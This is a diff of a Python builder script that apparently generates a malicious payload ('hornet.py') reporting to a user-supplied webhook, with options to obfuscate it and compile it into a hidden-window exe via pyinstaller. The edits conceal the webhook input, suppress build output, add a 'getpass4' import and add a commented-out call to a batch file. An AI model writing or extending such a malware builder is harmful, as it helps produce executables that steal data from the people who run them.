@@ -4,8 +4,10 @@ import subprocess
 import requests
 from colorama import *
 import time
-
+import getpass
 os.system('clear' if os.name == 'posix' else 'cls')
+import sys
+from getpass4 import getpass
 
 intro = """
 
@@ -43,8 +45,12 @@ while True:
     choice = input()
 
     if choice == "1":
+        #os.system("download_original_file.bat")
         os.system("cls || clear")
-        webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)
+        webhook = getpass("\nEnter Your Webhook: ")
+        clear_command = "cls" if os.name == "nt" else "clear"
+        os.system(clear_command)
+        #webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)
 
         filename = "hornet.py"
         filepath = os.path.join(os.getcwd(), filename)
@@ -75,9 +81,9 @@ while True:
             answer = input(Fore.CYAN + "\nDo you want to make exe file? (Y/N) " + Style.RESET_ALL)
             if answer.upper() == "Y":
                 if not obfuscate:
-                    cmd = f"pyinstaller --onefile --windowed {filename}"
+                    cmd = f"pyinstaller --onefile --windowed {filename} >nul"
                 else:
-                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]}"
+                    cmd = f"pyinstaller --onefile --windowed {filename} --name {filename.split('.')[0]} >nul"
                 subprocess.call(cmd, shell=True)
                 Write.Print(f"\n{filename} The file has been converted to exe.", Colors.red_to_yellow)
                 break
